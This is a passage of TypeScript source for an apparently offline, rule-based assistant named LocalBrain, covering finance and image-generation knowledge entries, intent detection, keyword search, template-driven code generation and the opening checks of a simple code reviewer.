    'Portfolio strategies: Risk Parity — equal risk contribution from each asset class (Ray Dalio\'s All Weather: 30% stocks, 40% long-term bonds, 15% intermediate bonds, 7.5% gold, 7.5% commodities). Uses leverage on low-vol assets to equalize risk. Permanent Portfolio (Harry Browne): 25% stocks, 25% long-term bonds, 25% gold, 25% cash — simple, all-weather. Factor investing (Smart Beta): target specific risk premiums systematically. Value: buy undervalued (low P/E, P/B). Momentum: buy recent winners, sell losers. Quality: high profitability, low debt. Size: small-cap premium. Low Volatility: low-vol stocks outperform risk-adjusted. Multi-factor: combine 2-4 factors. ETFs: trade on exchange like stocks, lower fees than mutual funds. Types: broad market (SPY, VTI), sector (XLF, XLK), international (VXUS, EFA), bond (BND, AGG), commodity (GLD, SLV), thematic (ARKK, ICLN). Index funds: passive, track benchmark (S&P 500, total market, MSCI World). Expense ratios: index funds 0.03-0.20%, active funds 0.50-1.50%. Dollar-cost averaging: invest fixed amount regularly regardless of price.', 1.1)

  add('portfolio_management', ['hedge fund strategy long short equity global macro event driven', 'portfolio performance attribution benchmark alpha tracking error', 'wealth management financial planning retirement income tax strategy'],
    'Advanced portfolio management: Hedge fund strategies — Long/Short Equity (buy undervalued, short overvalued, reduce market exposure), Global Macro (top-down, trade currencies, rates, commodities based on macro views), Event-Driven (mergers, bankruptcies, restructuring), Quantitative/Systematic (algorithmic, factor-based, statistical). Market Neutral: equal long/short exposure, zero beta, pure alpha. Fund of Funds: diversify across hedge fund strategies. Performance attribution: decompose returns into sources — asset allocation effect (being in right sectors), selection effect (picking right securities), interaction effect. Benchmark comparison: alpha (excess return), tracking error (standard deviation of excess returns), information ratio (alpha / tracking error). Drawdown analysis: max drawdown, drawdown duration, recovery time. Sharpe ratio (risk-adjusted returns), Sortino ratio (downside risk only), Calmar ratio (return / max drawdown). Wealth management: financial planning (goals-based), retirement planning (4% rule, Monte Carlo projections), tax optimization (asset location: taxable vs tax-advantaged accounts), estate planning, insurance needs analysis.', 1.1)

  // ── AI Toolkit / Diffusion Models / Image & Video Generation ────────────────
  add('ai_toolkit_image_gen', ['ai toolkit image generation diffusion model text to image', 'flux stable diffusion sdxl image generator neural network', 'text to image generation ai model prompt engineering diffusion'],
    'AI image generation with diffusion models: Text-to-image using denoising diffusion process. Models: FLUX.1/FLUX.2 (Black Forest Labs, transformer-based, high quality, 12GB+ VRAM), Stable Diffusion XL (Stability AI, UNet-based, 8GB VRAM), Stable Diffusion 1.5 (classic, 4GB VRAM), Chroma (lodestones), Lumina2 (Alpha-VLLM), Qwen-Image (Qwen), HiDream (HiDream-ai), OmniGen2. Key concepts: latent diffusion (operate in latent space via VAE encoder/decoder), CLIP text encoder (maps text to embeddings), UNet/Transformer (denoiser backbone), classifier-free guidance (CFG scale controls prompt adherence, typical 4-12), sampling steps (20-50 steps, more = higher quality but slower), samplers (Euler, DPM++, DDIM, FlowMatch). Prompt engineering: descriptive, add quality boosters ("high quality, detailed, sharp focus"), specify style, use negative prompts to avoid artifacts. Resolution: 512x512 (SD1.5), 1024x1024 (SDXL/FLUX). ai-toolkit: Python toolkit for training & generation, config via YAML, run with "python run.py config.yaml".', 1.2)

  add('ai_toolkit_image_gen', ['lora training fine tuning diffusion model custom', 'lora rank adapter low rank adaptation dreambooth', 'ai toolkit lora train custom model personalization'],
    'LoRA (Low-Rank Adaptation) training for diffusion models: Fine-tune large models with small adapters instead of full weights. Concept: decompose weight updates into low-rank matrices (AxB instead of full W), reducing trainable parameters from billions to millions. Key parameters: rank (4-128, higher = more capacity but more VRAM), learning rate (1e-4 to 1e-6), training steps (1000-10000), batch size (1-4), resolution (512-1024). Training data: 10-50 high-quality images with text captions (.txt files alongside images). Trigger word: unique identifier for the trained concept (e.g., "sks person"). ai-toolkit config: YAML with job: train, process type: sd_trainer, network type: lora, datasets with folder_path and caption_ext. Optimizers: AdamW8bit (memory efficient), Prodigy (adaptive LR). Features: gradient checkpointing (saves VRAM), caption dropout (regularization), cache latents to disk, sample generation during training for monitoring. Output: .safetensors adapter file, combinable with base model at inference.', 1.2)

  add('ai_toolkit_image_gen', ['video generation text to video image to video wan ltx', 'ai video model diffusion text prompt video generation', 'image editing instruction edit flux kontext qwen edit'],
    'AI video generation & image editing: Video models in ai-toolkit — Wan 2.1/2.2 (Wan-AI, text-to-video and image-to-video, 1.3B and 14B parameter variants, 8-24GB VRAM), LTX-2/2.3 (Lightricks, text-to-video). Video generation pipeline: text prompt -> frame-by-frame denoising -> temporal consistency -> output video. Parameters: num_frames, fps, width/height, guidance_scale, steps. Image editing models: FLUX.1-Kontext (instruction-based editing, e.g., "change the color of the car to red"), Qwen-Image-Edit (multiple versions), HiDream-E1. Editing workflow: input image + instruction prompt -> edited output preserving unmodified regions. Model extraction: extract LoRA/LoCoN adapters from fine-tuned models by computing difference with base model. Model merging: combine multiple LoRA adapters. ai-toolkit jobs: generate (text-to-image/video), train (LoRA/full fine-tune), extract (LoRA/LoCoN extraction), mod (rescale LoRA weights). All configured via YAML, run with Python CLI or web UI.', 1.2)

  return entries
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §3  INTENT DETECTION — Understanding what the user wants                   ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

type Intent =
  | 'greeting'
  | 'help'
  | 'code_write'
  | 'code_review'
  | 'code_explain'
  | 'question'
  | 'correction'
  | 'search'
  | 'thanks'
  | 'general'

/** Detect the user's intent from their message. */
function detectIntent(message: string): Intent {
  const lower = message.toLowerCase().trim()

  // Greeting
  if (/^(hi|hello|hey|good\s*(morning|evening|afternoon)|howdy|greetings|yo)\b/i.test(lower)) return 'greeting'

  // Thanks
  if (/\b(thanks?|thank\s*you|appreciate|thx)\b/i.test(lower)) return 'thanks'

  // Help
  if (/\b(help|what can you|capabilities|features|how do i use)\b/i.test(lower)) return 'help'

  // Code write request
  if (/\b(write|create|generate|make|build|implement|code)\b.*\b(code|function|class|program|script|app|module|api|component)\b/i.test(lower)) return 'code_write'
  if (/\b(code|function|class|program|script)\b.*\b(for|that|which|to)\b/i.test(lower)) return 'code_write'

  // Code review
  if (/\b(review|check|analyze|audit|inspect|lint)\b.*\b(code|function|class|program)\b/i.test(lower)) return 'code_review'
  if (/\b(bug|error|issue|problem|fix|wrong|broken)\b.*\b(code|function|program)\b/i.test(lower)) return 'code_review'

  // Code explain
  if (/\b(explain|what does|how does|what is|understand)\b.*\b(code|function|class|this)\b/i.test(lower)) return 'code_explain'

  // Correction/feedback
  if (/\b(no|wrong|incorrect|actually|correction|that's not right|not what i meant)\b/i.test(lower)) return 'correction'

  // Search
  if (/\b(search|find|look up|lookup|what is|define|definition)\b/i.test(lower)) return 'search'

  // Question
  if (/\?$/.test(lower) || /^(what|how|why|when|where|who|which|can|could|should|would|is|are|do|does)\b/i.test(lower)) return 'question'

  return 'general'
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §4  KEYWORD EXTRACTION — Finding relevant terms                            ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

const STOP_WORDS = new Set([
  'a', 'an', 'the', 'is', 'are', 'was', 'were', 'be', 'been', 'being',
  'have', 'has', 'had', 'do', 'does', 'did', 'will', 'would', 'could',
  'should', 'may', 'might', 'can', 'shall', 'to', 'of', 'in', 'for',
  'on', 'with', 'at', 'by', 'from', 'as', 'into', 'through', 'during',
  'before', 'after', 'above', 'below', 'between', 'out', 'off', 'over',
  'under', 'again', 'further', 'then', 'once', 'here', 'there', 'when',
  'where', 'why', 'how', 'all', 'each', 'every', 'both', 'few', 'more',
  'most', 'other', 'some', 'such', 'no', 'not', 'only', 'own', 'same',
  'so', 'than', 'too', 'very', 'just', 'about', 'also', 'and', 'but',
  'or', 'if', 'while', 'this', 'that', 'these', 'those', 'it', 'its',
  'i', 'me', 'my', 'we', 'our', 'you', 'your', 'he', 'she', 'they',
  'what', 'which', 'who', 'whom', 'please', 'make', 'write', 'create',
])

/** Extract meaningful keywords from text. */
function extractKeywords(text: string): string[] {
  return text
    .toLowerCase()
    .replace(/[^a-z0-9#+.\s-]/g, ' ')
    .split(/\s+/)
    .filter(w => w.length > 1 && !STOP_WORDS.has(w))
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §5  KNOWLEDGE SEARCH — Finding relevant knowledge                          ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

/** Format a search result into a numbered line for display. */
function formatSearchResultLine(
  r: { title: string; score: number; content: string },
  index: number,
): string {
  const MAX_CONTENT_LEN = 150
  const truncatedContent = r.content.length > MAX_CONTENT_LEN
    ? r.content.slice(0, MAX_CONTENT_LEN) + '...'
    : r.content
  return `${index + 1}. **${r.title}** (${(r.score * 100).toFixed(0)}% relevance): ${truncatedContent}`
}

/** Search the knowledge base for relevant entries. */
function searchKnowledge(
  knowledgeBase: KnowledgeEntry[],
  keywords: string[],
  limit = 5,
): KnowledgeSearchResult[] {
  if (keywords.length === 0) return []

  const results: KnowledgeSearchResult[] = []

  for (const entry of knowledgeBase) {
    const matchedKeywords: string[] = []
    let score = 0

    for (const keyword of keywords) {
      for (const entryKeyword of entry.keywords) {
        // Exact match (highest priority)
        if (keyword === entryKeyword) {
          score += 3 * entry.weight
          matchedKeywords.push(keyword)
        }
        // Entry keyword contains query keyword (e.g., entry "reinforcement learning" matches query "reinforcement")
        // Min length 3 prevents short words like "is", "at", "to" from triggering false partial matches
        else if (entryKeyword.includes(keyword) && keyword.length >= 3) {
          score += 1.5 * entry.weight
          matchedKeywords.push(keyword)
        }
        // Query keyword contains entry keyword (less specific, lower score)
        // Min length 3 on entry keyword prevents short entry keywords from matching everything
        else if (keyword.includes(entryKeyword) && entryKeyword.length >= 3) {
          score += 1.0 * entry.weight
          matchedKeywords.push(keyword)
        }
      }

      // Also check if keyword appears in the content
      if (entry.content.toLowerCase().includes(keyword)) {
        score += 0.5 * entry.weight
        if (!matchedKeywords.includes(keyword)) matchedKeywords.push(keyword)
      }
    }

    if (score > 0) {
      // Boost entries that have been useful before
      const useBoost = Math.min(entry.useCount * 0.1, 1)
      // Precision boost: reward entries that match MORE of the query keywords
      const uniqueMatches = new Set(matchedKeywords).size
      const precisionBoost = uniqueMatches >= 3 ? uniqueMatches * 0.3 : 0
      results.push({ entry, score: score + useBoost + precisionBoost, matchedKeywords: [...new Set(matchedKeywords)] })
    }
  }

  return results
    .sort((a, b) => b.score - a.score)
    .slice(0, limit)
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §6  RESPONSE GENERATION — Building intelligent responses                   ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

/** Build a response from knowledge search results and context. */
function buildResponse(
  intent: Intent,
  message: string,
  knowledgeResults: KnowledgeSearchResult[],
  learnedPatterns: LearnedPattern[],
  conversationHistory: ApiMessage[],
  _creativity: number,
): string {
  // Check learned patterns
  const matchedPattern = findBestLearnedPattern(message, learnedPatterns)

  // Build from knowledge base
  if (knowledgeResults.length > 0) {
    const topResult = knowledgeResults[0]!

    // If KB has a very strong match, prefer it over learned patterns
    // This handles keyword collision resolution where the KB entry is clearly the right answer
    if (topResult.score >= 3) {
      // If we also have a learned pattern, check if KB is significantly more specific
      if (matchedPattern && matchedPattern.confidence >= 0.7) {
        // Count how many query keywords are exact-matched by the KB entry keywords
        const msgKeywords = extractKeywords(message)
        const kbExactMatches = msgKeywords.filter(kw =>
          topResult.entry.keywords.some(ek => ek === kw)
        ).length
        const patternExactMatches = msgKeywords.filter(kw =>
          matchedPattern.keywords.some(pk => pk === kw)
        ).length
        // KB wins if it has more exact keyword matches than the learned pattern
        if (kbExactMatches > patternExactMatches) {
          let response = topResult.entry.content
          if (knowledgeResults.length > 1 && knowledgeResults[1]!.score >= 2) {
            const additional = knowledgeResults[1]!.entry.content
            if (knowledgeResults[1]!.entry.category !== topResult.entry.category) {
              response += '\n\n' + additional
            }
          }
          return response
        }
        // Otherwise, learned pattern wins (it's from a previous successful interaction)
        return matchedPattern.response
      }

      // No competing learned pattern — use KB directly
      let response = topResult.entry.content
      if (knowledgeResults.length > 1 && knowledgeResults[1]!.score >= 2) {
        const additional = knowledgeResults[1]!.entry.content
        if (knowledgeResults[1]!.entry.category !== topResult.entry.category) {
          response += '\n\n' + additional
        }
      }
      return response
    }

    // For weaker KB matches, prefer learned patterns
    if (matchedPattern && matchedPattern.confidence >= 0.7) {
      return matchedPattern.response
    }

    // Medium score — use knowledge but indicate uncertainty
    if (topResult.score >= 1) {
      return `Based on what I know: ${topResult.entry.content}\n\nNote: My answer is based on pattern matching from my knowledge base. If this isn't quite right, please correct me and I'll learn from it!`
    }
  }

  // Context-based response from conversation history
  if (conversationHistory.length > 0) {
    const lastExchange = conversationHistory.slice(-4)
    const contextKeywords = lastExchange
      .filter(m => m.role === 'assistant' && typeof m.content === 'string')
      .flatMap(m => extractKeywords(typeof m.content === 'string' ? m.content : ''))
    if (contextKeywords.length > 0) {
      const contextResults = searchKnowledge(buildKnowledgeBase(), contextKeywords, 2)
      if (contextResults.length > 0 && contextResults[0]!.score >= 2) {
        return `Continuing from our conversation: ${contextResults[0]!.entry.content}`
      }
    }
  }

  // Fallback responses based on intent
  switch (intent) {
    case 'greeting':
      return 'Hello! I am LocalBrain — your standalone AI assistant. I work completely offline with no API needed. I can write code in 24 languages, review code, answer programming questions, and I learn from our conversations. How can I help?'
    case 'help':
      return 'Here\'s what I can do:\n\n1. **Chat** — Answer questions about programming, algorithms, design patterns, and more\n2. **Write Code** — Generate code in 24 languages (TypeScript, Python, Rust, Go, Java, etc.)\n3. **Review Code** — Find bugs, security issues, and style problems\n4. **Learn** — I remember our conversations and improve over time\n5. **Search** — Query my knowledge base on programming topics\n\nTry asking me to write a function, explain a concept, or review some code!'
    case 'thanks':
      return 'You\'re welcome! If my response wasn\'t exactly right, feel free to correct me — I\'ll learn from it for future conversations.'
    case 'correction':
      return 'Thank you for the correction! I\'ve noted this feedback and will use it to improve my future responses. Could you tell me what the correct answer should be? I\'ll learn from it.'
    default:
      return `I understand you're asking about "${message.slice(0, 100)}". While I don't have specific knowledge about this topic yet, I can learn! If you teach me about it, I'll remember for next time. I'm strongest with programming topics — try asking about code, algorithms, or software design.`
  }
}

/** Find the best matching learned pattern for a message. */
function findBestLearnedPattern(message: string, patterns: LearnedPattern[]): LearnedPattern | null {
  if (patterns.length === 0) return null

  const msgKeywords = extractKeywords(message)
  let best: LearnedPattern | null = null
  let bestScore = 0

  for (const pattern of patterns) {
    let score = 0

    // Check keyword overlap
    for (const kw of msgKeywords) {
      if (pattern.keywords.some(pk => pk === kw || pk.includes(kw) || kw.includes(pk))) {
        score += 2
      }
    }

    // Check input pattern similarity
    const patternWords = pattern.inputPattern.toLowerCase().split(/\s+/)
    const messageWords = message.toLowerCase().split(/\s+/)
    const overlap = patternWords.filter(w => messageWords.includes(w)).length
    score += overlap * 1.5

    // Adjust by confidence and reinforcements
    score *= pattern.confidence * (1 + Math.min(pattern.reinforcements * 0.1, 0.5))

    if (score > bestScore) {
      bestScore = score
      best = pattern
    }
  }

  // Only return if the match is strong enough
  return bestScore >= 3 ? best : null
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §7  CODE GENERATION — Template + pattern based code writing                ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

/** Generate code locally using templates and patterns. */
function generateCodeLocally(request: CodeRequest): CodeResult {
  const { description, language, context, style = 'production' } = request
  const lower = description.toLowerCase()
  const info = getLanguageInfo(language)

  // Try to detect what kind of code structure is needed
  let templateType = 'function'
  if (/\b(class|object|oop)\b/i.test(lower)) templateType = 'class'
  if (/\b(interface|type|contract)\b/i.test(lower)) templateType = 'interface'
  if (/\b(test|spec|assert)\b/i.test(lower)) templateType = 'test'
  if (/\b(api|endpoint|route|handler|server)\b/i.test(lower)) templateType = 'api'
  if (/\b(struct)\b/i.test(lower)) templateType = 'struct'
  if (/\b(enum)\b/i.test(lower)) templateType = 'enum_'

  // Extract a name from the description
  const nameMatch = description.match(/(?:called|named|for)\s+["`']?(\w+)["`']?/i)
  const name = nameMatch?.[1] ?? toCamelCase(extractMainSubject(description))

  // Try template-based generation first
  const template = getCodeTemplate(language, templateType)

  let code: string
  if (template) {
    code = template
      .replace(/\{\{name\}\}/g, name)
      .replace(/\{\{description\}\}/g, description)
      .replace(/\{\{params\}\}/g, inferParams(description, language))
      .replace(/\{\{returnType\}\}/g, inferReturnType(description, language))
      .replace(/\{\{body\}\}/g, generateBody(description, language, style))
  } else {
    // Fallback: generate a basic structure
    code = generateFallbackCode(name, description, language, templateType, style)
  }

  // Add context as a comment if provided
  if (context) {
    const commentPrefix = info.comment || '//'
    code = `${commentPrefix} Context: ${context}\n\n${code}`
  }

  code = formatCode(code)

  const explanation = `Generated ${style} ${language} code for: ${description}. ` +
    `Structure: ${templateType}. ` +
    (template ? 'Built from language-specific template.' : 'Built from general pattern.') +
    (style === 'production' ? ' Includes error handling and comments.' : '')

  return {
    code,
    language,
    explanation,
    linesOfCode: code.split('\n').length,
    complexity: estimateComplexity(code),
  }
}

/** Extract the main subject/noun from a description. */
function extractMainSubject(description: string): string {
  // Remove common prefixes
  const cleaned = description
    .replace(/^(write|create|generate|make|build|implement)\s+(a\s+|an\s+|the\s+)?/i, '')
    .replace(/\s+(function|class|module|component|method|api|endpoint)\s*/i, ' ')
    .trim()

  // Take first meaningful word(s)
  const words = cleaned.split(/\s+/).slice(0, 3)
  return words.join(' ')
}

/** Convert a phrase to camelCase. */
function toCamelCase(phrase: string): string {
  return phrase
    .split(/[\s_-]+/)
    .map((word, i) => i === 0 ? word.toLowerCase() : word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
    .join('')
}

/** Check if text appears to contain code. */
function code_likeContent(text: string): boolean {
  return /[{}[\];]|=>|function\s|class\s|def\s|import\s|const\s|let\s|var\s/.test(text)
}

/** Infer function parameters from description. */
function inferParams(description: string, language: ProgrammingLanguage): string {
  const params: string[] = []
  const lower = description.toLowerCase()

  // Common parameter patterns
  if (/\b(string|text|name|message|input)\b/i.test(lower)) {
    params.push(typedParam('input', 'string', language))
  }
  if (/\b(number|count|size|length|amount|value)\b/i.test(lower)) {
    params.push(typedParam('value', 'number', language))
  }
  if (/\b(array|list|items|collection|elements)\b/i.test(lower)) {
    params.push(typedParam('items', 'array', language))
  }
  if (/\b(object|data|config|options|settings)\b/i.test(lower)) {
    params.push(typedParam('options', 'object', language))
  }
  if (/\b(boolean|flag|enabled|active)\b/i.test(lower)) {
    params.push(typedParam('enabled', 'boolean', language))
  }

  if (params.length === 0) {
    params.push(typedParam('input', 'string', language))
  }

  return params.join(', ')
}

/** Format a typed parameter for a specific language. */
function typedParam(name: string, type: string, language: ProgrammingLanguage): string {
  const typeMap: Record<string, Record<string, string>> = {
    string:  { typescript: 'string', python: 'str', rust: '&str', go: 'string', java: 'String', csharp: 'string', swift: 'String', kotlin: 'String', ruby: '', php: 'string', c: 'const char*', cpp: 'const std::string&' },
    number:  { typescript: 'number', python: 'int', rust: 'i64', go: 'int64', java: 'long', csharp: 'long', swift: 'Int', kotlin: 'Long', ruby: '', php: 'int', c: 'long', cpp: 'long' },
    boolean: { typescript: 'boolean', python: 'bool', rust: 'bool', go: 'bool', java: 'boolean', csharp: 'bool', swift: 'Bool', kotlin: 'Boolean', ruby: '', php: 'bool', c: 'bool', cpp: 'bool' },
    array:   { typescript: 'unknown[]', python: 'list', rust: 'Vec<T>', go: '[]interface{}', java: 'List<Object>', csharp: 'List<object>', swift: '[Any]', kotlin: 'List<Any>', ruby: '', php: 'array', c: 'void*', cpp: 'std::vector<T>' },
    object:  { typescript: 'Record<string, unknown>', python: 'dict', rust: 'HashMap<String, String>', go: 'map[string]interface{}', java: 'Map<String, Object>', csharp: 'Dictionary<string, object>', swift: '[String: Any]', kotlin: 'Map<String, Any>', ruby: '', php: 'array', c: 'void*', cpp: 'std::map<std::string, std::string>' },
  }

  const langType = typeMap[type]?.[language] ?? type

  switch (language) {
    case 'typescript': case 'swift': case 'kotlin':
      return `${name}: ${langType}`
    case 'python':
      return `${name}: ${langType}`
    case 'rust':
      return `${name}: ${langType}`
    case 'go':
      return `${name} ${langType}`
    case 'java': case 'csharp': case 'c': case 'cpp':
      return `${langType} ${name}`
    case 'ruby': case 'lua': case 'elixir':
      return name
    case 'php':
      return `${langType} $${name}`
    default:
      return `${name}: ${langType}`
  }
}

/** Infer return type from description. */
function inferReturnType(description: string, language: ProgrammingLanguage): string {
  const lower = description.toLowerCase()

  let type = 'string'
  if (/\b(number|count|calculate|sum|total|average|max|min)\b/i.test(lower)) type = 'number'
  if (/\b(boolean|check|is|has|validate|verify|exists)\b/i.test(lower)) type = 'boolean'
  if (/\b(array|list|filter|map|sort|find all|collect)\b/i.test(lower)) type = 'array'
  if (/\b(object|data|config|create|build|construct)\b/i.test(lower)) type = 'object'
  if (/\b(void|print|log|display|nothing|save|write|delete|remove)\b/i.test(lower)) type = 'void'

  const returnTypes: Record<string, Record<string, string>> = {
    string:  { typescript: 'string', python: ' -> str', rust: 'String', go: 'string', java: 'String', csharp: 'string', swift: 'String', kotlin: 'String' },
    number:  { typescript: 'number', python: ' -> int', rust: 'i64', go: 'int64', java: 'long', csharp: 'long', swift: 'Int', kotlin: 'Long' },
    boolean: { typescript: 'boolean', python: ' -> bool', rust: 'bool', go: 'bool', java: 'boolean', csharp: 'bool', swift: 'Bool', kotlin: 'Boolean' },
    array:   { typescript: 'unknown[]', python: ' -> list', rust: 'Vec<String>', go: '[]string', java: 'List<Object>', csharp: 'List<object>', swift: '[Any]', kotlin: 'List<Any>' },
    object:  { typescript: 'Record<string, unknown>', python: ' -> dict', rust: 'HashMap<String, String>', go: 'map[string]interface{}', java: 'Map<String, Object>', csharp: 'Dictionary<string, object>', swift: '[String: Any]', kotlin: 'Map<String, Any>' },
    void:    { typescript: 'void', python: ' -> None', rust: '()', go: '', java: 'void', csharp: 'void', swift: 'Void', kotlin: 'Unit' },
  }

  return returnTypes[type]?.[language] ?? 'string'
}

/** Generate a function body based on description. */
function generateBody(description: string, language: ProgrammingLanguage, style: string): string {
  const lower = description.toLowerCase()
  const info = getLanguageInfo(language)
  const comment = info.comment || '//'

  const lines: string[] = []

  if (style === 'production' || style === 'detailed') {
    lines.push(`${comment} TODO: Implement — ${description}`)
  }

  // Generate basic logic based on detected operation
  if (/\b(sort|order|arrange)\b/i.test(lower)) {
    lines.push(sortSnippet(language))
  } else if (/\b(filter|select|where)\b/i.test(lower)) {
    lines.push(filterSnippet(language))
  } else if (/\b(map|transform|convert)\b/i.test(lower)) {
    lines.push(mapSnippet(language))
  } else if (/\b(reduce|sum|total|aggregate)\b/i.test(lower)) {
    lines.push(reduceSnippet(language))
  } else if (/\b(find|search|lookup)\b/i.test(lower)) {
    lines.push(findSnippet(language))
  } else if (/\b(validate|check|verify)\b/i.test(lower)) {
    lines.push(validateSnippet(language))
  } else {
    lines.push(returnSnippet(language))
  }

  if (style === 'production') {
    lines.push('')
    lines.push(`${comment} Add error handling and edge cases as needed`)
  }

  return lines.join('\n    ')
}

function sortSnippet(lang: ProgrammingLanguage): string {
  const snippets: Record<string, string> = {
    typescript: 'return [...items].sort((a, b) => a > b ? 1 : -1)',
    javascript: 'return [...items].sort((a, b) => a > b ? 1 : -1)',
    python: 'return sorted(items)',
    rust: 'let mut sorted = items.clone();\n    sorted.sort();\n    sorted',
    go: 'sort.Slice(items, func(i, j int) bool { return items[i] < items[j] })\n\treturn items',
    java: 'Collections.sort(items);\n    return items;',
  }
  return snippets[lang] ?? 'return items.sort()'
}

function filterSnippet(lang: ProgrammingLanguage): string {
  const snippets: Record<string, string> = {
    typescript: 'return items.filter(item => item !== undefined)',
    javascript: 'return items.filter(item => item !== undefined)',
    python: 'return [item for item in items if item is not None]',
    rust: 'items.into_iter().filter(|item| !item.is_empty()).collect()',
    go: 'var result []string\n\tfor _, item := range items {\n\t\tif item != "" {\n\t\t\tresult = append(result, item)\n\t\t}\n\t}\n\treturn result',
    java: 'return items.stream().filter(Objects::nonNull).collect(Collectors.toList());',
  }
  return snippets[lang] ?? 'return items.filter(Boolean)'
}

function mapSnippet(lang: ProgrammingLanguage): string {
  const snippets: Record<string, string> = {
    typescript: 'return items.map(item => String(item))',
    javascript: 'return items.map(item => String(item))',
    python: 'return [str(item) for item in items]',
    rust: 'items.iter().map(|item| item.to_string()).collect()',
    go: 'result := make([]string, len(items))\n\tfor i, item := range items {\n\t\tresult[i] = fmt.Sprintf("%v", item)\n\t}\n\treturn result',
    java: 'return items.stream().map(Object::toString).collect(Collectors.toList());',
  }
  return snippets[lang] ?? 'return items.map(String)'
}

function reduceSnippet(lang: ProgrammingLanguage): string {
  const snippets: Record<string, string> = {
    typescript: 'return items.reduce((sum, item) => sum + item, 0)',
    javascript: 'return items.reduce((sum, item) => sum + item, 0)',
    python: 'return sum(items)',
    rust: 'items.iter().sum()',
    go: 'var total int64\n\tfor _, item := range items {\n\t\ttotal += item\n\t}\n\treturn total',
    java: 'return items.stream().mapToLong(Long::valueOf).sum();',
  }
  return snippets[lang] ?? 'return items.reduce((a, b) => a + b, 0)'
}

function findSnippet(lang: ProgrammingLanguage): string {
  const snippets: Record<string, string> = {
    typescript: 'return items.find(item => item === input) ?? null',
    javascript: 'return items.find(item => item === input) ?? null',
    python: 'return next((item for item in items if item == input), None)',
    rust: 'items.iter().find(|&item| item == &input).cloned()',
    go: 'for _, item := range items {\n\t\tif item == input {\n\t\t\treturn item, true\n\t\t}\n\t}\n\treturn "", false',
    java: 'return items.stream().filter(item -> item.equals(input)).findFirst().orElse(null);',
  }
  return snippets[lang] ?? 'return items.find(i => i === input)'
}

function validateSnippet(lang: ProgrammingLanguage): string {
  const snippets: Record<string, string> = {
    typescript: 'if (!input || input.trim().length === 0) return false\nreturn true',
    javascript: 'if (!input || input.trim().length === 0) return false\nreturn true',
    python: 'if not input or not input.strip():\n        return False\n    return True',
    rust: '!input.is_empty() && !input.trim().is_empty()',
    go: 'return len(strings.TrimSpace(input)) > 0',
    java: 'return input != null && !input.trim().isEmpty();',
  }
  return snippets[lang] ?? 'return input != null && input.length > 0'
}

function returnSnippet(lang: ProgrammingLanguage): string {
  const snippets: Record<string, string> = {
    typescript: 'return input',
    javascript: 'return input',
    python: 'return input',
    rust: 'input',
    go: 'return input',
    java: 'return input;',
    c: 'return input;',
    cpp: 'return input;',
  }
  return snippets[lang] ?? 'return input'
}

/** Generate fallback code when no template matches. */
function generateFallbackCode(
  name: string,
  description: string,
  language: ProgrammingLanguage,
  templateType: string,
  style: string,
): string {
  const info = getLanguageInfo(language)
  const comment = info.comment || '//'
  const params = inferParams(description, language)
  const returnType = inferReturnType(description, language)
  const body = generateBody(description, language, style)

  const structures: Record<string, Record<string, string>> = {
    function: {
      typescript: `${comment} ${description}\nexport function ${name}(${params}): ${returnType} {\n  ${body}\n}`,
      javascript: `${comment} ${description}\nexport function ${name}(${params}) {\n  ${body}\n}`,
      python: `${comment} ${description}\ndef ${name}(${params})${returnType}:\n    ${body}`,
      rust: `/// ${description}\npub fn ${name}(${params}) -> ${returnType} {\n    ${body}\n}`,
      go: `// ${description}\nfunc ${name}(${params}) ${returnType} {\n\t${body}\n}`,
      java: `// ${description}\npublic static ${returnType} ${name}(${params}) {\n    ${body}\n}`,
    },
    class: {
      typescript: `${comment} ${description}\nexport class ${name} {\n  constructor(${params}) {\n    ${body}\n  }\n}`,
      python: `${comment} ${description}\nclass ${name}:\n    def __init__(self, ${params}):\n        ${body}`,
      java: `// ${description}\npublic class ${name} {\n    public ${name}(${params}) {\n        ${body}\n    }\n}`,
    },
  }

  return structures[templateType]?.[language]
    ?? structures['function']?.[language]
    ?? `${comment} ${description}\n${comment} Language: ${language}\n${comment} TODO: Implement ${name}`
}

// ╔═══════════════════════════════════════════════════════════════════════════════╗
// ║  §8  CODE REVIEW — Rule-based static analysis                               ║
// ╚═══════════════════════════════════════════════════════════════════════════════╝

/** Review code locally using rule-based static analysis. */
function reviewCodeLocally(request: CodeReviewRequest): CodeReviewResult {
  const { code, language, focus = ['all'] } = request
  const checkAll = focus.includes('all')
  const issues: CodeIssue[] = []
  const lines = code.split('\n')

  // ── Bug Detection ──
  if (checkAll || focus.includes('bugs')) {
    // Unused variables (simple detection)
    const declarations = code.match(/(?:const|let|var|int|string|auto)\s+(\w+)/g) ?? []
    for (const decl of declarations) {
      const varName = decl.split(/\s+/).pop()
      if (varName && varName.length > 1) {
        const uses = code.split(varName).length - 1
        if (uses === 1) {
          const lineNum = lines.findIndex(l => l.includes(decl)) + 1
          issues.push({ severity: 'warning', line: lineNum || undefined, message: `Variable '${varName}' is declared but appears to be unused`, suggestion: `Remove unused variable '${varName}' or use it` })
        }
      }
    }

    // Empty catch blocks
    if (/catch\s*\([^)]*\)\s*\{[\s]*\}/.test(code)) {
      const lineNum = lines.findIndex(l => /catch\s*\(/.test(l)) + 1
      issues.push({ severity: 'error', line: lineNum || undefined, message: 'Empty catch block — errors are silently swallowed', suggestion: 'Log the error or handle it appropriately' })
    }

    // == instead of === (JavaScript/TypeScript)
    if (['typescript', 'javascript'].includes(language)) {
      for (let i = 0; i < lines.length; i++) {
        // Match == that is NOT preceded by ! or = and NOT followed by =
        const line = lines[i]!
        const eePattern = /(?<![=!])==(?!=)/
        if (eePattern.test(line)) {
          issues.push({ severity: 'warning', line: i + 1, message: 'Use === instead of == for strict equality', suggestion: 'Replace == with === to avoid type coercion bugs' })
        }
      }
    }

    // Console.log in production code
    for (let i = 0; i < lines.length; i++) {
      if (/console\.log\(/.test(lines[i]!)) {
        issues.push({ severity: 'info', line: i + 1, message: 'console.log found — remove before production', suggestion: 'Use a proper logging library instead' })
      }
    }
  }

  // ── Security Analysis ──
  if (checkAll || focus.includes('security')) {
